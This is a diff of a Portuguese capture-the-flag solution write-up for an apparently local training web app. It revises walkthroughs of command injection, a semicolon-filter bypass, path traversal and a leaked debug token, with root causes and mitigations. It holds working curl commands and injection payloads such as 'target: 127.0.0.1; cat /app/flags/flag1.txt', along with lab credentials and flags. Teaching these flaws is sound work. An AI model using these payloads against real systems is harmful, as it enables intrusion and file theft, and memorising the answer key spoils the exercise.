@@ -8,13 +8,6 @@ http://127.0.0.1:8090
 
 ## Login
 
-```bash
-curl -s -c cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{"username":"analyst","password":"analyst123"}' \
-  http://127.0.0.1:8090/api/auth/login
-```
-
 Credenciais:
 
 ```text
@@ -22,32 +15,67 @@ analyst:analyst123
 admin:netaudit_admin_2026
 ```
 
-O usuario admin existe no codigo, mas nao e necessario para o fluxo principal.
+Exemplo:
 
-## 1. Command Injection em check de host
+```bash
+curl -s -c cookies.txt \
+  -H "Content-Type: application/json" \
+  -d '{"username":"analyst","password":"analyst123"}' \
+  http://127.0.0.1:8090/api/auth/login
+```
 
-Endpoint usado pela UI:
+## 1. Asset Check Command Injection
+
+Fluxo manual:
+
+1. No dashboard, clique em "Verificar" em qualquer ativo.
+2. Capture a requisicao no Burp.
+3. Envie para Repeater.
+4. Altere apenas `target`.
+
+Rota real:
 
 ```text
-POST /api/tools/check
+POST /api/assets/check
+```
+
+Body normal enviado pela UI:
+
+```json
+{
+  "assetId": "gw-01",
+  "checkType": "icmp",
+  "target": "gateway.local"
+}
 ```
 
 Prova de execucao:
 
-```bash
-curl -s -b cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{"host":"127.0.0.1; whoami"}' \
-  http://127.0.0.1:8090/api/tools/check
+```json
+{
+  "assetId": "gw-01",
+  "checkType": "icmp",
+  "target": "127.0.0.1; whoami"
+}
 ```
 
 Leitura da flag:
 
+```json
+{
+  "assetId": "gw-01",
+  "checkType": "icmp",
+  "target": "127.0.0.1; cat /app/flags/flag1.txt"
+}
+```
+
+Curl opcional:
+
 ```bash
 curl -s -b cookies.txt \
   -H "Content-Type: application/json" \
-  -d '{"host":"127.0.0.1; cat /app/flags/flag1.txt"}' \
-  http://127.0.0.1:8090/api/tools/check
+  -d '{"assetId":"gw-01","checkType":"icmp","target":"127.0.0.1; cat /app/flags/flag1.txt"}' \
+  http://127.0.0.1:8090/api/assets/check
 ```
 
 Flag:
@@ -56,80 +84,74 @@ Flag:
 FLAG{command_injection_ping_lab3}
 ```
 
-Causa raiz: `child_process.exec` executa uma string montada com input do usuario:
+Causa raiz: o backend confia em `target` enviado pelo cliente e monta:
 
 ```text
-ping -c 2 ${host}
+ping -c 2 ${target}
 ```
 
-Correcoes recomendadas:
+Mitigacao:
 
+- nao confiar em `target` vindo do cliente;
+- recalcular o hostname no servidor a partir de `assetId`;
 - nao usar `exec` com concatenacao;
 - usar `execFile` ou `spawn` com argumentos separados;
-- validar host/IP por allowlist;
-- nao tentar corrigir apenas bloqueando caracteres;
-- separar permissoes do processo da aplicacao;
-- em ambiente real, nao armazenar flags ou segredos acessiveis pelo processo web.
+- validar allowlist de host/IP;
+- executar a aplicacao com privilegios minimos.
 
-Observacao de validacao: a resposta de prova com `whoami` deve mostrar execucao de comando, mas nao deve conter `FLAG{}`. A flag so aparece quando o aluno le explicitamente o arquivo.
+## 2. Resolver Legado Escondido
 
-## 2. Resolver legado com filtro fraco
-
-Descoberta: `public/js/app.js` contem:
+Descoberta no JavaScript:
 
 ```js
-const legacyResolverEndpoint = "/api/tools/resolve";
+const legacyAssetResolver = "/api/assets/resolve";
 ```
 
-Endpoint:
+Rota:
 
 ```text
-POST /api/tools/resolve
+POST /api/assets/resolve
 ```
 
 Entrada normal:
 
-```bash
-curl -s -b cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{"host":"localhost"}' \
-  http://127.0.0.1:8090/api/tools/resolve
+```json
+{
+  "target": "localhost"
+}
 ```
 
-Payload bloqueado:
+Filtro bloqueado:
 
-```bash
-curl -s -b cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{"host":"localhost; whoami"}' \
-  http://127.0.0.1:8090/api/tools/resolve
+```json
+{
+  "target": "localhost; whoami"
+}
 ```
 
 Bypass:
 
-```bash
-curl -s -b cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{"host":"localhost && id"}' \
-  http://127.0.0.1:8090/api/tools/resolve
+```json
+{
+  "target": "localhost && id"
+}
 ```
 
-Leitura da flag:
+Flag:
 
-```bash
-curl -s -b cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{"host":"localhost && cat /app/flags/flag2.txt"}' \
-  http://127.0.0.1:8090/api/tools/resolve
+```json
+{
+  "target": "localhost && cat /app/flags/flag2.txt"
+}
 ```
 
-Alternativa com pipe:
+Curl opcional:
 
 ```bash
 curl -s -b cookies.txt \
   -H "Content-Type: application/json" \
-  -d '{"host":"localhost | cat /app/flags/flag2.txt"}' \
-  http://127.0.0.1:8090/api/tools/resolve
+  -d '{"target":"localhost && cat /app/flags/flag2.txt"}' \
+  http://127.0.0.1:8090/api/assets/resolve
 ```
 
 Flag:
@@ -138,50 +160,40 @@ Flag:
 FLAG{weak_filter_bypass_lab3}
 ```
 
-Causa raiz: o backend bloqueia apenas `;`, mas ainda executa `nslookup ${host}` via shell.
+Causa raiz: blacklist fraca bloqueia apenas `;`, enquanto o backend executa:
 
-Correcoes recomendadas:
+```text
+nslookup ${target}
+```
 
-- blacklist de metacaracteres nao e suficiente;
-- usar `execFile("nslookup", [host])` ou `spawn` com argumentos separados;
-- validar formato por allowlist;
-- remover dependencia de shell para operacoes de rede;
-- executar a aplicacao com privilegios minimos.
+Mitigacao:
 
-Observacao de validacao: `localhost && id` deve provar bypass sem retornar flag automaticamente.
+- bloquear caracteres isolados nao e suficiente;
+- usar `execFile("nslookup", [target])`;
+- validar allowlist;
+- remover shell da operacao.
 
-## 3. Descoberta do support panel
+## 3. Support Diagnostics e Logs
 
-Pistas:
+Descoberta:
 
 ```html
 <!-- support diagnostics moved to /support.html after incident NT-2026-041 -->
 ```
 
-```js
-const supportDiagnostics = "/support.html";
-```
-
-Pagina escondida:
+Pagina:
 
 ```text
 /support.html
 ```
 
-Ela chama:
+Rota:
 
 ```text
 GET /api/support/log?file=app.log
 ```
 
-Leitura de log normal:
-
-```bash
-curl -s -b cookies.txt \
-  "http://127.0.0.1:8090/api/support/log?file=app.log"
-```
-
-Pistas vazadas em `app.log`:
+Pistas em `app.log`:
 
 ```text
 support health endpoint moved to /api/internal/health
@@ -191,72 +203,59 @@ support token middle: debug
 support token suffix: 2026
 backup route only exposed by internal healthcheck
 archived incident evidence moved outside data directory
-legacy resolver endpoint kept for support troubleshooting
 ```
 
-Token reconstruido:
+Token:
 
 ```text
 netaudit-debug-2026
 ```
 
-Causa raiz: logs operacionais expostos para usuario autenticado comum vazam nomes de endpoint, header e segredo reconstruivel.
+Causa raiz: logs operacionais expostos vazam rotas internas, header e partes de segredo.
 
-Correcoes recomendadas:
+Mitigacao:
 
-- nao registrar segredos;
+- nao vazar tokens em logs;
 - mascarar dados sensiveis;
-- restringir logs a papeis autorizados;
-- separar logs de suporte da interface comum;
-- rotacionar qualquer token que tenha aparecido em log.
+- restringir logs por autorizacao;
+- rotacionar segredos vazados.
 
-## 4. Information Disclosure e Path Traversal
+## 4. Path Traversal
 
-Endpoint vulneravel:
+O endpoint vulneravel usa `path.join("/app/data", file)` sem validar o caminho final.
 
-```text
-GET /api/support/log?file=...
-```
-
-Flag3 via traversal:
+Flag3:
 
 ```bash
 curl -s -b cookies.txt \
   "http://127.0.0.1:8090/api/support/log?file=../flags/flag3.txt"
 ```
 
-Flag:
-
 ```text
 FLAG{logs_leaking_sensitive_info_lab3}
 ```
 
-Flag4 via traversal:
+Flag4:
 
 ```bash
 curl -s -b cookies.txt \
   "http://127.0.0.1:8090/api/support/log?file=../flags/flag4.txt"
 ```
 
-Flag:
-
 ```text
 FLAG{path_traversal_log_viewer_lab3}
 ```
 
-Causa raiz: o backend usa `path.join("/app/data", file)` sem validar se o caminho final permanece em `/app/data`.
-
-Correcoes recomendadas:
+Mitigacao:
 
 - usar allowlist de arquivos;
-- normalizar o caminho com `path.resolve`;
-- verificar se o caminho final permanece dentro do diretorio permitido;
-- nao aceitar caminho arbitrario do usuario;
-- retornar erros genericos sem expor estrutura interna.
+- normalizar com `path.resolve`;
+- verificar se o caminho final permanece no diretorio permitido;
+- nao aceitar caminhos arbitrarios do usuario.
 
-## 5. Internal health com Broken Access Control
+## 5. Internal Health
 
-Endpoint:
+Rota:
 
 ```text
 GET /api/internal/health
@@ -276,7 +275,7 @@ curl -s \
   http://127.0.0.1:8090/api/internal/health
 ```
 
-Resposta esperada contem:
+Resposta revela:
 
 ```json
 {
@@ -290,22 +289,18 @@ Resposta esperada contem:
 }
 ```
 
-Flag5 nao e retornada diretamente aqui. O endpoint apenas revela o arquivo diagnostico.
+Nao retorna flag diretamente.
 
-Causa raiz: rota interna confia em token estatico vazado e nao exige sessao de admin/autorizacao real.
-
-Correcoes recomendadas:
+Mitigacao:
 
 - nao usar token estatico de debug;
-- nao vazar token em logs;
 - remover endpoints internos em producao;
 - exigir autenticacao e autorizacao reais;
-- segregar rotas administrativas;
-- rotacionar segredos vazados.
+- segregar rotas administrativas.
 
-## 6. Backup command injection
+## 6. Backup Command Injection
 
-Endpoint:
+Rota:
 
 ```text
 POST /api/internal/backup
@@ -317,62 +312,59 @@ Header:
 X-Support-Token: netaudit-debug-2026
 ```
 
-Entrada normal:
+Body normal:
 
-```bash
-curl -s \
-  -H "Content-Type: application/json" \
-  -H "X-Support-Token: netaudit-debug-2026" \
-  -d '{"archiveName":"backup.tar.gz"}' \
-  http://127.0.0.1:8090/api/internal/backup
+```json
+{
+  "archiveName": "backup.tar.gz"
+}
 ```
 
-Ler flag5:
+Flag5:
 
-```bash
-curl -s \
-  -H "Content-Type: application/json" \
-  -H "X-Support-Token: netaudit-debug-2026" \
-  -d '{"archiveName":"backup.tar.gz; cat /app/flags/flag5.txt"}' \
-  http://127.0.0.1:8090/api/internal/backup
+```json
+{
+  "archiveName": "backup.tar.gz; cat /app/flags/flag5.txt"
+}
 ```
 
-Flag:
+Root:
+
+```json
+{
+  "archiveName": "backup.tar.gz; cat /app/flags/root.txt"
+}
+```
+
+Curl opcional:
+
+```bash
+curl -s -X POST http://127.0.0.1:8090/api/internal/backup \
+  -H "Content-Type: application/json" \
+  -H "X-Support-Token: netaudit-debug-2026" \
+  -d '{"archiveName":"backup.tar.gz; cat /app/flags/root.txt"}'
+```
+
+Flags:
 
 ```text
 FLAG{admin_route_exposed_by_debug_token}
-```
-
-Ler flag final:
-
-```bash
-curl -s \
-  -H "Content-Type: application/json" \
-  -H "X-Support-Token: netaudit-debug-2026" \
-  -d '{"archiveName":"backup.tar.gz; cat /app/flags/root.txt"}' \
-  http://127.0.0.1:8090/api/internal/backup
-```
-
-Flag final:
-
-```text
 FLAG{admin_backup_command_injection_lab3}
 ```
 
-Causa raiz: `archiveName` e concatenado em:
+Causa raiz:
 
 ```text
 tar -czf /tmp/${archiveName} /app/data
 ```
 
-Correcoes recomendadas:
+Mitigacao:
 
 - gerar nome de arquivo no servidor;
 - validar por allowlist;
-- usar `spawn` ou `execFile` com argumentos separados;
-- nunca permitir que input controle uma linha de shell;
-- separar permissoes do processo que executa backup;
-- nao manter segredos legiveis pelo processo web em ambiente real.
+- usar `execFile` ou `spawn`;
+- separar permissoes do processo;
+- nao manter segredos legiveis pelo processo web.
 
 ## Lista de flags
 
